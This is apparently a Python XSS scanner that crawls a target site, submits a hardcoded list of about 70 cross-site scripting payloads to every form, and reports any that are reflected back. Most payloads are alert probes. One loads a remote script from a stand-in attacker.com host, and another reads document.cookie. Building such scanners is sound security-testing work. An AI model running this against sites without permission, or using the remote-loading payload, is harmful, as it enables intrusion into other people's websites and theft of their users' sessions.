import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

default_xss_payloads = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    '<img src="x" onerror="alert(1)">',
    '<body onload="alert(1)">',
    '<svg/onload=alert(1)>',
    '<iframe src="javascript:alert(1)"></iframe>',
    '"><img src="javascript:alert(1)">',
    '<svg><script>alert(1)</script>',
    '<details open ontoggle=alert(1)>',
    '<object data="javascript:alert(1)">',
    '<embed src="javascript:alert(1)">',
    '<link rel="stylesheet" href="javascript:alert(1)">',
    '<form><button formaction="javascript:alert(1)">CLICKME',
    '"><iframe src="javascript:alert(1)">',
    '<input type="image" src="javascript:alert(1)">',
    '<a href="javascript:alert(1)">CLICKME</a>',
    '<video src="javascript:alert(1)">',
    '<audio src="javascript:alert(1)">',
    '<base href="javascript:alert(1)//">',
    '<script src="data:text/javascript,alert(1)"></script>',
    '<input onfocus="alert(1)" autofocus>',
    '<button onclick="alert(1)">CLICKME</button>',
    '<marquee onstart="alert(1)">XSS</marquee>',
    '<keygen autofocus onfocus="alert(1)">',
    '<textarea onfocus="alert(1)" autofocus></textarea>',
    '<div onpointerover="alert(1)">Hover me</div>',
    '<div draggable="true" ondrag="alert(1)">Drag me</div>',
    '<span onclick="alert(1)">CLICKME</span>',
    '<select onfocus="alert(1)" autofocus><option>XSS</select>',
    '<isindex type=image src=javascript:alert(1)>',
    '<img src=x onerror="this.onerror=null; alert(1)">',
    '<img src=x onerror=alert(1)//',
    '<img src=x onerror="alert(1)";>',
    '<img src=x onerror="alert(1)">',
    '<img src=x onerror=alert(String.fromCharCode(88,83,83))>',
    '<img src="javascript:alert(1)">',
    '<script>alert(1)</script>',
    '<img src=1 href=1 onerror="alert(1)" >',
    '<svg><g onload="alert(1)"></g></svg>',
    '<svg/onload=alert(1)>',
    '<script x>alert(1)</script>',
    '<script src=//code.jquery.com/jquery-3.3.1.min.js></script><script>$.getScript("//attacker.com/xss.js")</script>',
    '<math><maction xlink:href="javascript:alert(1)">XSS</maction></math>',
    '<img src="x:alert(1)"/>',
    '<x onclick=alert(1)>XSS</x>',
    '<body onscroll=alert(1)>',
    '<bgsound src="javascript:alert(1)">',
    '<blink onmouseover=alert(1)>XSS</blink>',
    '<plaintext onmouseover=alert(1)>XSS',
    '<input type="text" value="<script>alert(1)</script>">',
    '<a href="javascript:alert(1)">CLICKME</a>',
    '<div style="background:url(javascript:alert(1))">CLICKME</div>',
    '<img src="x" onerror="alert(\'XSS\')">',
    '<script>alert(document.cookie)</script>',
    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
    '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
    '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
    '<style>@import "javascript:alert(\'XSS\')";</style>',
    '<body onload=alert(\'XSS\')>',
    '<img src="x" onerror="alert(1)">',
    '<input type="text" value="<script>alert(\'XSS\')">',
    '<a href="javascript:alert(\'XSS\')">CLICKME</a>',
    '<div style="background:url(javascript:alert(\'XSS\'))">CLICKME</div>',
    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
    '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
    '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
    '<style>@import "javascript:alert(\'XSS\')";</style>',
    '<body onload=alert(\'XSS\')>'
]

def find_all_pages(base_url):
    to_visit = [base_url]
    visited = set()
    pages = []

    while to_visit:
        url = to_visit.pop()
        if url in visited:
            continue
        visited.add(url)

        try:
            response = requests.get(url)
            if response.status_code != 200:
                continue

            soup = BeautifulSoup(response.text, 'html.parser')
            pages.append(url)

            for link in soup.find_all('a', href=True):
                full_url = urljoin(base_url, link['href'])
                if full_url.startswith(base_url) and full_url not in visited:
                    to_visit.append(full_url)
        except requests.RequestException as e:
            print(f"Error accessing {url}: {e}")

    return pages

def find_xss_vulnerabilities(url, payloads, methods, headers):
    vulnerabilities = []
    try:
        response = requests.get(url, headers=headers)
        soup = BeautifulSoup(response.text, 'html.parser')

        forms = soup.find_all('form')
        for form in forms:
            action = form.get('action')
            method = form.get('method', 'get').lower()
            inputs = form.find_all('input')

            form_url = urljoin(url, action)
            data = {inp.get('name'): inp.get('value', '') for inp in inputs if inp.get('name')}

            for payload in payloads:
                for http_method in methods:
                    test_data = data.copy()
                    for key in test_data:
                        test_data[key] = payload

                    if http_method == 'post':
                        test_response = requests.post(form_url, data=test_data, headers=headers)
                    else:
                        test_response = requests.get(form_url, params=test_data, headers=headers)

                    if payload in test_response.text:
                        vulnerability = {
                            'url': form_url,
                            'method': http_method.upper(),
                            'payload': payload
                        }
                        vulnerabilities.append(vulnerability)
                        print(f"[!] XSS vulnerability found on {form_url} with payload: {payload}")
    except requests.RequestException as e:
        print(f"Error accessing {url}: {e}")

    return vulnerabilities

def scan_website(base_url, custom_payloads=None, methods=None, headers=None, save_to_file=None):
    payloads = custom_payloads if custom_payloads else default_xss_payloads
    methods = methods if methods else ['get', 'post']
    headers = headers if headers else {}

    pages = find_all_pages(base_url)
    all_vulnerabilities = []
    for page in pages:
        print(f"[*] Scanning {page}")
        vulnerabilities = find_xss_vulnerabilities(page, payloads, methods, headers)
        all_vulnerabilities.extend(vulnerabilities)
    
    if all_vulnerabilities:
        print(f"\n[+] Total XSS vulnerabilities found: {len(all_vulnerabilities)}")
        for vulnerability in all_vulnerabilities:
            print(f"  - URL: {vulnerability['url']} | Method: {vulnerability['method']} | Payload: {vulnerability['payload']}")
    else:
        print("\n[-] No XSS vulnerabilities found.")

    if save_to_file and all_vulnerabilities:
        save_to_file_func(save_to_file, all_vulnerabilities)

    return all_vulnerabilities

def save_to_file_func(filepath, data):
    try:
        with open(filepath, 'w') as file:
            for item in data:
                file.write(f"URL: {item['url']}\nMethod: {item['method']}\nPayload: {item['payload']}\n\n")
        print(f"[+] Results saved to {filepath}")
    except IOError as e:
        print(f"Error saving to file {filepath}: {e}")

def get_vulnerability_details(vulnerabilities):
    details = []
    for vulnerability in vulnerabilities:
        details.append({
            'url': vulnerability['url'],
            'method': vulnerability['method'],
            'payload': vulnerability['payload']
        })
    return details
